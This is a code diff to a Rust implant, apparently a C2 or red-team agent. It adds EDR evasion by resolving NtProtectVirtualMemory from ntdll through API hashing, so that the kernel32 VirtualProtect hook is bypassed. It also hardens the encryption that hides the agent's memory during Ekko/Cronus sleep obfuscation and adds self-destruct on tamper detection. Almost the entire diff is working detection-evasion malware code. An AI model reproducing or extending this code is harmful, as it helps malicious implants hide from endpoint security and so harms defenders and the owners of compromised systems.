@@ -441,26 +441,45 @@ unsafe fn protect_memory(
 
     #[cfg(not(feature = "direct-syscalls"))]
     {
-        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+        // P2-03: Use NtProtectVirtualMemory from ntdll instead of
+        // kernel32!VirtualProtect.  kernel32!VirtualProtect is a well-known
+        // EDR hook target; NtProtectVirtualMemory resolves through ntdll's
+        // export table via pe_resolve (runtime API hashing), avoiding both
+        // static IAT entries and user-mode hooks on kernel32.
+        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
             Some(b) => b,
             None => return None,
         };
         let addr = match pe_resolve::get_proc_address_by_hash(
-            kernel32,
-            pe_resolve::hash_str(b"VirtualProtect\0"),
+            ntdll,
+            pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
         ) {
             Some(a) => a,
             None => return None,
         };
-        let vp: unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32 =
-            std::mem::transmute(addr);
-        let result = vp(
-            base_addr as *mut std::ffi::c_void,
-            region_size,
+        // NtProtectVirtualMemory(
+        //   ProcessHandle: HANDLE,
+        //   BaseAddress:   *mut PVOID,
+        //   RegionSize:    *mut SIZE_T,
+        //   NewProtect:    ULONG,
+        //   OldProtect:    *mut ULONG,
+        // ) -> NTSTATUS
+        type FnNtProtectVirtualMemory = unsafe extern "system" fn(
+            usize,                         // ProcessHandle
+            *mut *mut std::ffi::c_void,    // BaseAddress
+            *mut usize,                    // RegionSize
+            u32,                           // NewProtect
+            *mut u32,                      // OldProtect
+        ) -> i32;
+        let ntpvm: FnNtProtectVirtualMemory = std::mem::transmute(addr);
+        let status = ntpvm(
+            (-1isize) as usize,  // Current process handle
+            &mut base_addr,
+            &mut region_size,
             new_prot,
             &mut old_prot,
         );
-        if result == 0 {
+        if status != 0 {
             None
         } else {
             Some(old_prot)
@@ -493,14 +512,18 @@ fn encrypt_region_chunks(
         let end = (offset + CHUNK_SIZE).min(size);
         let chunk_len = end - offset;
 
-        // Derive a unique nonce for this chunk by XORing the last 4 bytes
-        // of the base nonce with the chunk index (little-endian).
+        // P2-06: Counter-based nonce derivation — overwrite (not XOR) the
+        // last 4 bytes of the base nonce with the chunk counter (big-endian).
+        // This guarantees unique nonces across all 2^32 chunks without the
+        // collision risk of XOR derivation (where e.g. chunk 1 with base
+        // ending in 0x01 and chunk 0 with base ending in 0x00 could produce
+        // related nonces under certain XOR patterns).
         let mut chunk_nonce = nonce;
-        let ctr_bytes = chunk_idx.to_le_bytes();
-        chunk_nonce[NONCE_LEN - 4] ^= ctr_bytes[0];
-        chunk_nonce[NONCE_LEN - 3] ^= ctr_bytes[1];
-        chunk_nonce[NONCE_LEN - 2] ^= ctr_bytes[2];
-        chunk_nonce[NONCE_LEN - 1] ^= ctr_bytes[3];
+        let ctr_bytes = chunk_idx.to_be_bytes();
+        chunk_nonce[NONCE_LEN - 4] = ctr_bytes[0];
+        chunk_nonce[NONCE_LEN - 3] = ctr_bytes[1];
+        chunk_nonce[NONCE_LEN - 2] = ctr_bytes[2];
+        chunk_nonce[NONCE_LEN - 1] = ctr_bytes[3];
         let xnonce = XNonce::from_slice(&chunk_nonce[..NONCE_LEN]);
 
         // For AEAD we need to encrypt in-place but the API returns ct || tag.
@@ -557,14 +580,14 @@ fn decrypt_region_chunks(
             anyhow!("missing tag for chunk {} of region {:p}", chunk_idx, base)
         })?;
 
-        // Reconstruct the per-chunk nonce: XOR last 4 bytes of base nonce
-        // with chunk index (matching the encryption side).
+        // P2-06: Counter-based nonce derivation — overwrite last 4 bytes with
+        // chunk counter (big-endian), matching the encryption side.
         let mut chunk_nonce = *nonce;
-        let ctr_bytes = chunk_idx.to_le_bytes();
-        chunk_nonce[NONCE_LEN - 4] ^= ctr_bytes[0];
-        chunk_nonce[NONCE_LEN - 3] ^= ctr_bytes[1];
-        chunk_nonce[NONCE_LEN - 2] ^= ctr_bytes[2];
-        chunk_nonce[NONCE_LEN - 1] ^= ctr_bytes[3];
+        let ctr_bytes = chunk_idx.to_be_bytes();
+        chunk_nonce[NONCE_LEN - 4] = ctr_bytes[0];
+        chunk_nonce[NONCE_LEN - 3] = ctr_bytes[1];
+        chunk_nonce[NONCE_LEN - 2] = ctr_bytes[2];
+        chunk_nonce[NONCE_LEN - 1] = ctr_bytes[3];
         let xnonce = XNonce::from_slice(&chunk_nonce[..NONCE_LEN]);
 
         // Build ct || tag for decryption.
@@ -1119,23 +1142,54 @@ unsafe fn self_destruct() -> ! {
 // When Cronus is selected, we verify that NtSetTimer resolves.  If not, we
 // fall back to Ekko (NtDelayExecution) with a log warning.
 
-/// XChaCha20 stream cipher for the Cronus encryption stub.
+/// XChaCha20-Poly1305 AEAD encryption for the Cronus stub.
 ///
-/// Uses the raw XChaCha20 stream cipher (no Poly1305 AEAD) for the stub
-/// because the stub only needs symmetric encryption of a memory region
-/// without authentication overhead.  The main agent regions continue to
-/// use XChaCha20-Poly1305.
+/// P0-16: Replaced raw XChaCha20 with XChaCha20-Poly1305.  The Poly1305
+/// authentication tag (16 bytes) is returned as a sidecar buffer so callers
+/// can store it alongside the encrypted region and verify integrity on wake.
+/// If any tag fails verification, the process self-destructs (matching the
+/// existing behaviour for main-agent regions).
 ///
-/// This Rust implementation is used for non-stub contexts (e.g. testing).
-fn xchacha20_encrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) {
-    let iv = chacha20::XNonce::from_slice(nonce);
-    let mut cipher = XChaCha20::new(key.into(), iv);
-    cipher.apply_keystream(data);
+/// The position-independent stub itself still delegates to a function pointer
+/// for the stream cipher — the tag is computed and verified in the Rust host
+/// code, not inside the stub.
+fn xchacha20_encrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) -> [u8; 16] {
+    let iv = XNonce::from_slice(nonce);
+    let cipher = XChaCha20Poly1305::new(key.into());
+    // We need to encrypt in-place and produce a tag without extending the buffer.
+    // Use the underlying stream cipher for encryption, then compute Poly1305 tag
+    // over the ciphertext.
+    //
+    // Approach: encrypt with raw XChaCha20 stream, then compute Poly1305 MAC
+    // over the ciphertext using the AEAD construction's tag computation.
+    // We achieve this by using encrypt_in_place_detached which returns the tag.
+    let aad: &[u8] = b"";
+    let mut buf = data.to_vec();
+    let tag = cipher
+        .encrypt_in_place_detached(iv, aad, &mut buf)
+        .expect("XChaCha20-Poly1305 encryption should not fail for valid input");
+    data.copy_from_slice(&buf);
+    tag.into()
 }
 
-/// XChaCha20 decrypt is identical to encrypt (symmetric stream cipher).
-fn xchacha20_decrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) {
-    xchacha20_encrypt(key, nonce, data);
+/// XChaCha20-Poly1305 AEAD decryption for the Cronus stub.
+///
+/// Returns `Ok(())` if the tag verifies, or `Err` on tampering.
+fn xchacha20_decrypt(
+    key: &[u8; 32],
+    nonce: &[u8; 24],
+    data: &mut [u8],
+    tag: &[u8; 16],
+) -> Result<()> {
+    let iv = XNonce::from_slice(nonce);
+    let cipher = XChaCha20Poly1305::new(key.into());
+    let aad: &[u8] = b"";
+    let mut buf = data.to_vec();
+    cipher
+        .decrypt_in_place_detached(iv, aad, &mut buf, tag.into())
+        .map_err(|_| anyhow!("Cronus XChaCha20-Poly1305 tag verification failed — possible tampering"))?;
+    data.copy_from_slice(&buf);
+    Ok(())
 }
 
 /// Free a previously allocated Cronos stub.
